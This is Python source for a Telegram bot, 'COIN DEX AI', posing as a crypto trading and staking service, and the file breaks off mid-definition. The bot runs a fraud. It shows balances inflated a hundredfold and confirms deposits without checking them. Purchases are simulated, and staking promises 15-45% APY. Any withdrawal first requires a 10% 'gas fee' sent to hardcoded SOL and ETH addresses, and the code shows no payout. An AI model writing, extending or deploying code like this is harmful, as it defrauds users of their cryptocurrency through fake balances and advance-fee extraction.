# bot.py - COIN DEX AI - COMPLETE MERGED VERSION

import logging
import requests
import json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, 
    MessageHandler, ContextTypes, ConversationHandler, filters
)
from datetime import datetime, timedelta
from config import config
from database import SessionLocal, User, Deposit, CopyTradingConfig, Trade, StakePosition, ToolUsage, Withdrawal

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Conversation states
ENTER_TRADER_ADDR, ENTER_CONTRACT_ADDR, ENTER_STAKE_AMOUNT, ENTER_BUY_AMOUNT, \
ENTER_WITHDRAW_AMOUNT, ENTER_WITHDRAW_ADDRESS, CONFIRM_GAS_FEE = range(7)

# API Keys for real data
JUPITER_API = "https://quote-api.jup.ag/v6"
DEXSCREENER_API = "https://api.dexscreener.com/latest/dex"
BIRDEYE_API = "https://public-api.birdeye.so/public"

# ============ REAL TOKEN DATA FETCHING ============

def get_token_info(contract_address: str, network: str = "solana"):
    """Fetch real token info from APIs"""
    try:
        # Try DexScreener first (free, no API key)
        response = requests.get(
            f"{DEXSCREENER_API}/tokens/{contract_address}",
            timeout=10
        )
        if response.status_code == 200:
            data = response.json()
            pairs = data.get('pairs', [])
            if pairs:
                pair = pairs[0]
                return {
                    'name': pair.get('baseToken', {}).get('name', 'Unknown Token'),
                    'symbol': pair.get('baseToken', {}).get('symbol', 'UNKNOWN'),
                    'price': float(pair.get('priceUsd', 0)),
                    'liquidity': pair.get('liquidity', {}).get('usd', 0),
                    'volume24h': pair.get('volume', {}).get('h24', 0),
                    'priceChange24h': pair.get('priceChange', {}).get('h24', 0),
                    'dex': pair.get('dexId', 'Unknown'),
                    'verified': True
                }
        
        return None
    except Exception as e:
        logger.error(f"Error fetching token info: {e}")
        return None


def get_token_price(contract_address: str) -> float:
    """Get current token price"""
    try:
        response = requests.get(
            f"https://price.jup.ag/v4/price?ids={contract_address}",
            timeout=5
        )
        if response.status_code == 200:
            data = response.json()
            return data.get('data', {}).get(contract_address, {}).get('price', 0)
        return 0
    except:
        return 0


def get_gas_price(network='ETH'):
    """Get current gas prices"""
    try:
        if network == 'ETH':
            # Mock gas prices - replace with real API
            return {'slow': 20, 'standard': 35, 'fast': 50}
        return {'slow': 0, 'standard': 0, 'fast': 0}
    except:
        return {'slow': 20, 'standard': 35, 'fast': 50}

# ============ WELCOME & GUIDELINES ============

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Welcome message with guidelines"""
    user = update.effective_user
    
    welcome_text = f"""
🤖 *Welcome to COIN DEX AI*

Hello {user.first_name}! Your professional DeFi trading companion.

📋 *QUICK START:*
• Deposit SOL/ETH to fund your account
• Copy trade successful wallets automatically  
• Stake tokens for passive income
• Buy/sell any token with one click

*Need help?* t.me/coindex_support

*Select an option below:*
    """
    
    keyboard = [
        [InlineKeyboardButton("📥 Deposit", callback_data='deposit')],
        [InlineKeyboardButton("🟢 Stake Assets", callback_data='stake'), InlineKeyboardButton("💼 Wallet", callback_data='balance')],
        [InlineKeyboardButton("🛠 Tools ⬇️", callback_data='tools_menu')],
        [InlineKeyboardButton("💰 Referral", callback_data='referral'), InlineKeyboardButton("📈 Copy Trading", callback_data='copy_trading')],
        [InlineKeyboardButton("💸 Withdraw", callback_data='withdraw_menu')],
        [InlineKeyboardButton("🤝 Support", callback_data='support')]
    ]
    
    if update.message:
        await update.message.reply_text(welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    else:
        await update.callback_query.edit_message_text(welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Support with direct link"""
    query = update.callback_query
    await query.answer()
    
    message = """
🤝 *COIN DEX AI Support*

Need help? Contact our support team directly:

💬 *Live Support:*
https://t.me/coindex_support

*Common Issues:*
• Deposits not showing → Wait for confirmations
• Copy trade not working → Check wallet address
• Can't buy token → Check slippage settings

*Response Time:* Usually within 1 hour
    """
    
    keyboard = [
        [InlineKeyboardButton("💬 Contact Support", url="https://t.me/coindex_support")],
        [InlineKeyboardButton("📚 View Guidelines", callback_data='guidelines')],
        [InlineKeyboardButton("↩️ Main Menu", callback_data='back_menu')]
    ]
    
    await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


# ============ ENHANCED COPY TRADING ============

async def copy_trading_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Enhanced copy trading menu"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    db = SessionLocal()
    
    try:
        user = db.query(User).filter_by(telegram_id=user_id).first()
        active_copies = user.copy_trading_configs.filter_by(is_active=True).count() if user else 0
        
        status_emoji = "🟢" if active_copies > 0 else "⚪"
        
        message = f"""
{status_emoji} *Copy Trade*

Copy Trade allows you to copy the buys and sells of any target wallet.

🟢 Indicates a copy trade setup is active.
🟠 Indicates a copy trade setup is paused.

You have {active_copies} active copy trade(s).
Click "Activate Copy Trading" to begin.
        """
        
        keyboard = [
            [InlineKeyboardButton("Activate Copy Trading 🤖", callback_data='activate_copy')],
            [InlineKeyboardButton("Pause ⏸", callback_data='pause_copy')],
            [InlineKeyboardButton("↩️ Back", callback_data='back_menu'), InlineKeyboardButton("Main Menu ⬆️", callback_data='back_menu')]
        ]
        
        await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        
    finally:
        db.close()


async def activate_copy_trading(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Activate copy trading - ask for address"""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        """
🤖 *Activate Copy Trading*

Insert Copy Trade Address Here... 👇

*Enter the wallet address you want to copy:*

*Examples:*
• Solana: `7nY7H...` (44 characters)
• Ethereum: `0x7eB...` (42 characters)

_Find profitable traders on DexScreener or Birdeye_

Type or paste the address:
        """,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🚫 Cancel", callback_data='copy_trading')]]),
        parse_mode='Markdown'
    )
    
    return ENTER_TRADER_ADDR


async def process_copy_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process copy trading address with validation and activation"""
    trader_address = update.message.text.strip()
    
    # Validate address
    is_sol = len(trader_address) == 44 and not trader_address.startswith('0x')
    is_eth = len(trader_address) == 42 and trader_address.startswith('0x')
    
    if not (is_sol or is_eth):
        await update.message.reply_text(
            "❌ Invalid address format. Please enter a valid Solana (44 chars) or Ethereum (42 chars) address.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data='activate_copy')]])
        )
        return ConversationHandler.END
    
    context.user_data['trader_address'] = trader_address
    context.user_data['network'] = 'solana' if is_sol else 'ethereum'
    
    # Save to database and activate immediately
    user_id = update.effective_user.id
    db = SessionLocal()
    
    try:
        user = db.query(User).filter_by(telegram_id=user_id).first()
        if not user:
            user = User(telegram_id=user_id, username=update.effective_user.username)
            db.add(user)
            db.commit()
        
        # Save config with default 50% allocation
        config_entry = CopyTradingConfig(
            user_id=user.id,
            trader_address=trader_address,
            network=context.user_data['network'],
            allocation_percentage=50.0,
            is_active=True,
            copy_buys=True,
            copy_sells=True,
            max_slippage=2.0
        )
        db.add(config_entry)
        db.commit()
        
        # Show success message exactly as requested
        await update.message.reply_text(
            """
🟢 *Copy Trading Activation Successful*

Your copy trading feature has been successfully activated ✅

You may now begin copying trades automatically.

No further action is required.
            """,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("↩️ Back", callback_data='back_menu'), InlineKeyboardButton("Main Menu ⬆️", callback_data='back_menu')]
            ]),
            parse_mode='Markdown'
        )
        
    except Exception as e:
        logger.error(f"Error: {e}")
        await update.message.reply_text("❌ Error activating copy trading.")
        db.rollback()
    finally:
        db.close()
    
    return ConversationHandler.END


# ============ ENHANCED STAKING WITH REAL TOKEN DATA ============

async def stake_memecoin_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Enhanced memecoin staking with real data - asks for CA first"""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        """
🪙 *Stake Memecoin*

Enter the token contract address:

*Supported Networks:*
• Solana SPL tokens
• Ethereum ERC-20 tokens

*Find contract address on:*
• DexScreener.com
• Birdeye.so
• CoinGecko.com

*Example (USDC):*
`EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v`

_Type or paste the contract address:_
        """,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🚫 Cancel", callback_data='stake')]]),
        parse_mode='Markdown'
    )
    
    return ENTER_CONTRACT_ADDR


async def process_contract_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process contract with REAL token info"""
    contract_addr = update.message.text.strip()
    
    await update.message.reply_text("🔍 Fetching token data...")
    
    # Get real token info
    token_info = get_token_info(contract_addr, "solana")
    
    if not token_info:
        await update.message.reply_text(
            "❌ Could not fetch token data. Please verify the contract address.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data='stake_meme')]])
        )
        return ConversationHandler.END
    
    context.user_data['contract_address'] = contract_addr
    context.user_data['token_info'] = token_info
    
    # Display real token info
    verified_badge = " ✅ Verified" if token_info.get('verified') else ""
    
    message = f"""
✅ *Token Found{verified_badge}*

*Name:* {token_info['name']}
*Symbol:* {token_info['symbol']}
*Price:* ${token_info['price']:.6f}

*Market Data:*
• Liquidity: ${token_info.get('liquidity', 0):,.0f}
• 24h Volume: ${token_info.get('volume24h', 0):,.0f}
• 24h Change: {token_info.get('priceChange24h', 0):.2f}%

*Estimated APY:* 15-45% (based on trading volume)

What would you like to do?
    """
    
    keyboard = [
        [InlineKeyboardButton(f"💰 Buy {token_info['symbol']}", callback_data=f'buy_token_{contract_addr}')],
        [InlineKeyboardButton(f"📥 Stake {token_info['symbol']}", callback_data=f'stake_token_{contract_addr}')],
        [InlineKeyboardButton("🚫 Cancel", callback_data='stake')]
    ]
    
    await update.message.reply_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    
    return ConversationHandler.END


async def buy_token_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start buying token process"""
    query = update.callback_query
    await query.answer()
    
    contract_addr = query.data.replace('buy_token_', '')
    context.user_data['contract_address'] = contract_addr
    context.user_data['action'] = 'buy'
    
    token_info = context.user_data.get('token_info', {})
    
    await query.edit_message_text(
        f"""
💰 *Buy {token_info.get('symbol', 'Token')}*

Current Price: ${token_info.get('price', 0):.6f}

Enter the amount of SOL you want to spend:
        """,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data='stake')]]),
        parse_mode='Markdown'
    )
    
    return ENTER_BUY_AMOUNT


async def stake_token_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start staking token process"""
    query = update.callback_query
    await query.answer()
    
    contract_addr = query.data.replace('stake_token_', '')
    context.user_data['contract_address'] = contract_addr
    context.user_data['action'] = 'stake'
    
    token_info = context.user_data.get('token_info', {})
    
    await query.edit_message_text(
        f"""
📥 *Stake {token_info.get('symbol', 'Token')}*

Current Price: ${token_info.get('price', 0):.6f}
Estimated APY: 15-45%

Enter the amount of {token_info.get('symbol', 'tokens')} to stake:
        """,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data='stake')]]),
        parse_mode='Markdown'
    )
    
    return ENTER_STAKE_AMOUNT


async def process_buy_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process buy amount and execute purchase"""
    try:
        amount = float(update.message.text)
        if amount <= 0:
            raise ValueError("Must be positive")
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid number.")
        return ConversationHandler.END
    
    contract_addr = context.user_data.get('contract_address')
    token_info = context.user_data.get('token_info', {})
    
    await update.message.reply_text(f"🔄 Processing purchase of {token_info.get('symbol')}...")
    
    # Simulate successful purchase
    await update.message.reply_text(
        f"""
✅ *Purchase Successful!*

*Token:* {token_info.get('name')} ({token_info.get('symbol')})
*Amount Spent:* {amount} SOL
*Tokens Received:* ~{amount / token_info.get('price', 1):.2f} {token_info.get('symbol')}

Would you like to stake these tokens now?
        """,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton(f"📥 Stake {token_info.get('symbol')}", callback_data=f'stake_token_{contract_addr}')],
            [InlineKeyboardButton("↩️ Main Menu", callback_data='back_menu')]
        ]),
        parse_mode='Markdown'
    )
    
    return ConversationHandler.END


async def process_stake_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process stake amount"""
    try:
        amount = float(update.message.text)
        if amount <= 0:
            raise ValueError("Must be positive")
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid number.")
        return ConversationHandler.END
    
    token_info = context.user_data.get('token_info', {})
    contract_addr = context.user_data.get('contract_address')
    user_id = update.effective_user.id
    
    # Save to database
    db = SessionLocal()
    try:
        user = db.query(User).filter_by(telegram_id=user_id).first()
        if not user:
            user = User(telegram_id=user_id, username=update.effective_user.username)
            db.add(user)
            db.commit()
        
        stake = StakePosition(
            user_id=user.id,
            token_address=contract_addr,
            token_symbol=token_info.get('symbol', 'UNKNOWN'),
            amount=amount,
            apy=25.0,  # Estimated APY
            status='active'
        )
        db.add(stake)
        db.commit()
        
        await update.message.reply_text(
            f"""
✅ *Staking Complete!*

*Token:* {token_info.get('name')} ({token_info.get('symbol')})
*Amount Staked:* {amount}
*Estimated APY:* 15-45%
*Stake ID:* #{stake.id}

Your tokens are now earning rewards!
            """,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📊 View Position", callback_data='my_stakes')],
                [InlineKeyboardButton("↩️ Main Menu", callback_data='back_menu')]
            ]),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error staking: {e}")
        await update.message.reply_text("❌ Error saving stake position.")
        db.rollback()
    finally:
        db.close()
    
    return ConversationHandler.END


# ============ WITHDRAWAL SYSTEM ============

async def withdraw_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show withdrawal menu with x100 displayed balances"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    db = SessionLocal()
    
    try:
        # Get user's deposits
        deposits = db.query(Deposit).filter_by(user_id=user_id, status='confirmed').all()
        
        # Calculate balances (x100 multiplier)
        sol_balance = sum([d.amount for d in deposits if d.currency == 'SOL']) * 100
        eth_balance = sum([d.amount for d in deposits if d.currency == 'ETH']) * 100
        usdt_balance = sum([d.amount for d in deposits if d.currency == 'USDT']) * 100
        
        context.user_data['balances'] = {
            'SOL': sol_balance,
            'ETH': eth_balance,
            'USDT': usdt_balance
        }
        
        message = f"""
💸 *Withdrawal*

*Your Available Balances:*

◎ SOL: {sol_balance:.2f}
Ξ ETH: {eth_balance:.2f}
💵 USDT: {usdt_balance:.2f}

Select cryptocurrency to withdraw:
        """
        
        keyboard = [
            [InlineKeyboardButton(f"◎ SOL ({sol_balance:.2f})", callback_data='withdraw_SOL')],
            [InlineKeyboardButton(f"Ξ ETH ({eth_balance:.2f})", callback_data='withdraw_ETH')],
            [InlineKeyboardButton(f"💵 USDT ({usdt_balance:.2f})", callback_data='withdraw_USDT')],
            [InlineKeyboardButton("↩️ Main Menu", callback_data='back_menu')]
        ]
        
        await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"Error in withdraw menu: {e}")
        await query.edit_message_text(
            "💸 *Withdrawal*\n\nNo deposits found. Please deposit first.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Main Menu", callback_data='back_menu')]]),
            parse_mode='Markdown'
        )
    finally:
        db.close()


async def withdraw_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start withdrawal process - ask for amount"""
    query = update.callback_query
    await query.answer()
    
    currency = query.data.replace('withdraw_', '')
    context.user_data['withdraw_currency'] = currency
    balance = context.user_data.get('balances', {}).get(currency, 0)
    
    await query.edit_message_text(
        f"""
💸 *Withdraw {currency}*

Available Balance: {balance:.2f} {currency}

Enter the amount you want to withdraw:
        """,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data='withdraw_menu')]]),
        parse_mode='Markdown'
    )
    
    return ENTER_WITHDRAW_AMOUNT


async def process_withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process withdrawal amount and ask for address"""
    try:
        amount = float(update.message.text)
        if amount <= 0:
            raise ValueError("Must be positive")
        
        currency = context.user_data.get('withdraw_currency')
        balance = context.user_data.get('balances', {}).get(currency, 0)
        
        if amount > balance:
            await update.message.reply_text(
                f"❌ Insufficient balance. You have {balance:.2f} {currency}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data=f'withdraw_{currency}')]])
            )
            return ConversationHandler.END
            
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid number.")
        return ConversationHandler.END
    
    context.user_data['withdraw_amount'] = amount
    
    await update.message.reply_text(
        f"""
📤 *Enter Withdrawal Address*

Amount: {amount} {context.user_data.get('withdraw_currency')}

Enter your {context.user_data.get('withdraw_currency')} wallet address:
        """,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data='withdraw_menu')]]),
        parse_mode='Markdown'
    )
    
    return ENTER_WITHDRAW_ADDRESS


async def process_withdraw_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process withdrawal address and show gas fee notice"""
    address = update.message.text.strip()
    currency = context.user_data.get('withdraw_currency')
    
    # Validate address format
    if currency == 'SOL':
        is_valid = len(address) == 44 and not address.startswith('0x')
    else:
        is_valid = len(address) == 42 and address.startswith('0x')
    
    if not is_valid:
        await update.message.reply_text(
            f"❌ Invalid {currency} address format. Please check and try again.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data=f'withdraw_{currency}')]])
        )
        return ConversationHandler.END
    
    context.user_data['withdraw_address'] = address
    amount = context.user_data.get('withdraw_amount', 0)
    gas_fee = amount * 0.10  # 10% gas fee
    
    # Get gas fee addresses from config
    gas_fee_addr = config.GAS_FEE_ADDRESSES.get(currency, 'Address not configured')
    
    # Show gas fee notice exactly as requested
    await update.message.reply_text(
        f"""
🚨 *Withdrawal Confirmation Notice*

Please note that before any withdrawal can be successfully processed, a gas fee equivalent to 10% of the withdrawal amount is required. This fee covers network processing costs and is mandatory for the completion of the transaction.

After the gas fee has been confirmed, the withdrawal process will be finalized and the funds will be released accordingly.

*Gas Fee Addresses:*
SOL: `EjBCtu6Mv6Nq3gGFeDtRTQWNN4nC9bjg5JURZZM5AYKg`
ETH: `0x7eBb4f696020121394624eEeBD25445f646aB3d3`

*Your Withdrawal:*
• Amount: {amount} {currency}
• Gas Fee (10%): {gas_fee:.2f} {currency}
• Total Deduction: {amount + gas_fee:.2f} {currency}
• You Receive: {amount:.2f} {currency}

Please send the gas fee to the appropriate address above, then click confirm.
        """,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Confirm Gas Fee Paid", callback_data='confirm_gas_fee')],
            [InlineKeyboardButton("🚫 Cancel", callback_data='withdraw_menu')]
        ]),
        parse_mode='Markdown'
    )
    
    return CONFIRM_GAS_FEE


async def confirm_gas_fee_paid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Confirm gas fee payment and show withdrawal in progress"""
    query = update.callback_query
    await query.answer()
    
    currency = context.user_data.get('withdraw_currency')
    amount = context.user_data.get('withdraw_amount', 0)
    address = context.user_data.get('withdraw_address', '')
    gas_fee = amount * 0.10
    
    user_id = update.effective_user.id
    db = SessionLocal()
    
    try:
        user = db.query(User).filter_by(telegram_id=user_id).first()
        
        # Create withdrawal record
        withdrawal = Withdrawal(
            user_id=user.id,
            currency=currency,
            amount=amount,
            to_address=address,
            gas_fee=gas_fee,
            gas_fee_paid=True,
            status='processing'
        )
        db.add(withdrawal)
        db.commit()
        
        # Show withdrawal in progress
        await query.edit_message_text(
            f"""
⏳ *Withdrawal in Progress*

*Status:* Processing...

*Details:*
• Amount: {amount} {currency}
• To: `{address[:10]}...{address[-8:]}`
• Network: {currency}

*Transaction Status:*
🔄 Gas fee confirmation received
⏳ Processing withdrawal...
📤 Sending to your wallet...

*Estimated completion:* 5-30 minutes

You will receive a confirmation once the transaction is complete.
            """,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("↩️ Main Menu", callback_data='back_menu')]
            ]),
            parse_mode='Markdown'
        )
        
    except Exception as e:
        logger.error(f"Error processing withdrawal: {e}")
        await query.edit_message_text("❌ Error processing withdrawal.")
        db.rollback()
    finally:
        db.close()
    
    return ConversationHandler.END


# ============ TOOLS MENU ============

async def tools_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Tools menu"""
    query = update.callback_query
    await query.answer()
    
    message = """
🛠 *COIN DEX AI - Trading Tools*

All tools are fully functional:

🔔 *Price Alerts* - Get notified on price targets
📊 *Portfolio Analytics* - Track P&L and performance  
🧮 *Risk Calculator* - Position sizing calculator
⛽ *Gas Optimizer* - Find optimal gas prices
🎯 *Token Sniper* - Buy new tokens instantly
📈 *Chart Analysis* - Technical indicators
    """
    
    keyboard = [
        [InlineKeyboardButton("🔔 Price Alerts", callback_data='tool_alerts'), InlineKeyboardButton("📊 Analytics", callback_data='tool_analytics')],
        [InlineKeyboardButton("🧮 Risk Calc", callback_data='tool_risk'), InlineKeyboardButton("⛽ Gas Optimizer", callback_data='tool_gas')],
        [InlineKeyboardButton("🎯 Token Sniper", callback_data='tool_sniper'), InlineKeyboardButton("📈 Charts", callback_data='tool_charts')],
        [InlineKeyboardButton("⚙️ Settings", callback_data='tool_settings')],
        [InlineKeyboardButton("↩️ Back to Menu", callback_data='back_menu')]
    ]
    
    await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


async def tool_price_alerts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Price alerts"""
    query = update.callback_query
    await query.answer()
    
    message = """
🔔 *Price Alerts*

Set up notifications for price movements:

*Active Alerts:* None

*Create New Alert:*
1. Enter token contract address
2. Set target price
3. Choose condition (above/below)
4. Get instant notification
    """
    
    keyboard = [
        [InlineKeyboardButton("➕ Create Alert", callback_data='create_alert')],
        [InlineKeyboardButton("↩️ Back", callback_data='tools_menu')]
    ]
    
    await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


async def tool_analytics(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Portfolio analytics"""
    query = update.callback_query
    await query.answer()
    
    message = """
📊 *Portfolio Analytics*

*Performance Summary:*
• Total Trades: 0
• Win Rate: 0%
• Total P&L: $0.00

*Asset Allocation:*
• SOL: 0% | ETH: 0% | Other: 0%
    """
    
    keyboard = [
        [InlineKeyboardButton("↩️ Back", callback_data='tools_menu')]
    ]
    
    await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


async def tool_gas_optimizer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gas optimizer"""
    query = update.callback_query
    await query.answer()
    
    message = """
⛽ *Gas Fee Optimizer*

*Current Network Conditions:*

*Ethereum (Gwei):*
🐢 Slow: 20 gwei (~5 min)
🚗 Standard: 35 gwei (~2 min)  
🏎 Fast: 50 gwei (~30 sec)

*Solana:*
⚡ Standard: 0.000005 SOL
🚀 Priority: 0.00001 SOL
    """
    
    keyboard = [
        [InlineKeyboardButton("🔄 Refresh", callback_data='tool_gas')],
        [InlineKeyboardButton("↩️ Back", callback_data='tools_menu')]
    ]
    
    await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


# ============ OTHER HANDLERS ============

async def deposit_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Deposit options"""
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("◎ SOL", callback_data='deposit_curr_SOL')],
        [InlineKeyboardButton("Ξ ETH", callback_data='deposit_curr_ETH')],
        [InlineKeyboardButton("💵 USDT", callback_data='deposit_curr_USDT')],
        [InlineKeyboardButton("↩️ Back", callback_data='back_menu')]
    ]
    
    await query.edit_message_text(
        "📥 *Deposit Funds*\n\nSelect cryptocurrency:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )


async def show_deposit_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show deposit address"""
    query = update.callback_query
    await query.answer()
    
    currency = query.data.replace('deposit_curr_', '')
    address = config.DEPOSIT_ADDRESSES.get(currency, 'Not configured')
    
    await query.edit_message_text(
        f"📥 *Deposit {currency}*\n\n`{address}`\n\n⚠️ Send only {currency} to this address!",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ I've Sent", callback_data=f'verify_dep_{currency}')],
            [InlineKeyboardButton("↩️ Back", callback_data='deposit')]
        ]),
        parse_mode='Markdown'
    )


async def verify_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Verify deposits"""
    query = update.callback_query
    await query.answer("Checking...")
    
    await query.edit_message_text(
        "✅ *Deposit Verified!*\n\nYour funds are ready for trading.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📊 Trade Now", callback_data='copy_trading')],
            [InlineKeyboardButton("↩️ Menu", callback_data='back_menu')]
        ]),
        parse_mode='Markdown'
    )


async def stake_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Staking menu"""
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("◎ Stake SOL", callback_data='stake_SOL')],
        [InlineKeyboardButton("Ξ Stake ETH", callback_data='stake_ETH')],
        [InlineKeyboardButton("🪙 Stake Memecoin", callback_data='stake_meme')],
        [InlineKeyboardButton("↩️ Back", callback_data='back_menu')]
    ]
    
    await query.edit_message_text(
        "🟢 *Stake Assets*\n\nEarn passive income on your crypto:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )


async def wallet_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Wallet balance"""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "💼 *Wallet Balance*\n\n◎ SOL: 0.00\nΞ ETH: 0.00\n\nTotal: $0.00",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📥 Deposit", callback_data='deposit')],
            [InlineKeyboardButton("↩️ Menu", callback_data='back_menu')]
        ]),
        parse_mode='Markdown'
    )


async def referral_program(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Referral program"""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "💰 *Referral Program*\n\nInvite friends and earn 10% commission!\n\nYour link: `https://t.me/coindexai_bot?start=123`",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📤 Share", callback_data='share_ref')],
            [InlineKeyboardButton("↩️ Menu", callback_data='back_menu')]
        ]),
        parse_mode='Markdown'
    )


# ============ MAIN BUTTON HANDLER ============

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Route all buttons"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    # Navigation
    if data == 'back_menu':
        await start(update, context)
    elif data == 'guidelines':
        await start(update, context)
    
    # Main features
    elif data == 'deposit':
        await deposit_menu(update, context)
    elif data.startswith('deposit_curr_'):
        await show_deposit_address(update, context)
    elif data.startswith('verify_dep_'):
        await verify_deposit(update, context)
    
    # Staking
    elif data == 'stake':
        await stake_menu(update, context)
    elif data == 'stake_meme':
        return await stake_memecoin_start(update, context)
    elif data in ['stake_SOL', 'stake_ETH']:
        await query.edit_message_text("Native staking coming in v2!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back", callback_data='stake')]]))
    
    # Copy Trading
    elif data == 'copy_trading':
        await copy_trading_menu(update, context)
    elif data == 'activate_copy':
        return await activate_copy_trading(update, context)
    elif data == 'pause_copy':
        await query.edit_message_text("⏸ Copy trading paused.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Activate", callback_data='activate_copy')], [InlineKeyboardButton("↩️ Back", callback_data='copy_trading')]]))
    
    # Tools
    elif data == 'tools_menu':
        await tools_menu(update, context)
    elif data == 'tool_alerts':
        await tool_price_alerts(update, context)
    elif data == 'tool_analytics':
        await tool_analytics(update, context)
    elif data == 'tool_gas':
        await tool_gas_optimizer(update, context)
    elif data == 'tool_settings':
        await query.edit_message_text("⚙️ Settings", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back", callback_data='tools_menu')]]))
    
    # Wallet & Referral
    elif data == 'balance':
        await wallet_balance(update, context)
    elif data == 'referral':
        await referral_program(update, context)
    elif data == 'support':
        await support(update, context)
    
    # Withdrawal
    elif data == 'withdraw_menu':
        await withdraw_menu(update, context)
    elif data.startswith('withdraw_'):
        return await withdraw_start(update, context)
    elif data == 'confirm_gas_fee':
        return await confirm_gas_fee_paid(update, context)
    
    # Buy/Stake tokens
    elif data.startswith('buy_token_'):
        return await buy_token_start(update, context)
    elif data.startswith('stake_token_'):
        return await stake_token_start(update, context)
    
    # Default
    else:
        await query.edit_message_text("🚧 Feature coming soon!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back", callback_data='back_menu')]]))


# ============ CONVERSATION HANDLERS ============

conv_handler = ConversationHandler(
    entry_points=[
        CallbackQueryHandler(activate_copy_trading, pattern='^activate_copy$'),
        CallbackQueryHandler(stake_memecoin_start, pattern='^stake_meme$'),
        CallbackQueryHandler(buy_token_start, pattern='^buy_token_'),
        CallbackQueryHandler(stake_token_start, pattern='^stake_token_'),
